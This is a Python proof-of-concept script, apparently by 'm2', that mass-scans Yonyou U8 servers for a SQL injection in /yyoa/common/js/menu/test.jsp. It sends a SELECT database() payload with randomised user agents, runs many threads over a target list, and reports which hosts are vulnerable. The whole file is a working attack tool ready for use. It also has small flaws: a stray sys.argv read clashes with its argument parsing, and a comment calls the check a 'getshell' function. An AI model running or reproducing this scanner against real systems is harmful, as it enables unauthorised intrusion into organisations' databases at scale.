#! /usr/bin/env python
# -*- encoding: utf-8 -*-
import requests
import sys
from time import time
import random
import urllib3
import base64
from urllib import parse
from argparse import ArgumentParser
import threadpool


#python3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]


#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua


#getshell函数
def sql_poc(url):
	#防止url格式混乱，增加容错率
	url=parse.urlparse(url)
	url=url.scheme + '://' + url.netloc
	vuln_url=url + '/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())'

	#添加ua头	
	headers = {
	'User-Agent': get_ua()
	}

	try:
		r=requests.post(url=vuln_url,headers=headers,verify=False,timeout=10)
		if "database" in r.text and r.status_code==200:
			print("\033[32m[+]%s 存在sql注入漏洞\npayload:%s\n\033[0m" %(url,vuln_url))
		else:
			print("\033[31m[-]%s 不存在漏洞\033[0m" %url)
	except:
		print("\033[31m[-]%s request false!\033[0m" %url)


#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		works.append(i)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(sql_poc, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == "__main__":
	show = r'''

		用友U8 sql注入   
	                 
			        sql_poc by m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='sql_poc By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	start=time()
	if url != None and filename == None:
		sql_poc(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	end=time()
	print('任务完成，用时%ds' %(end-start))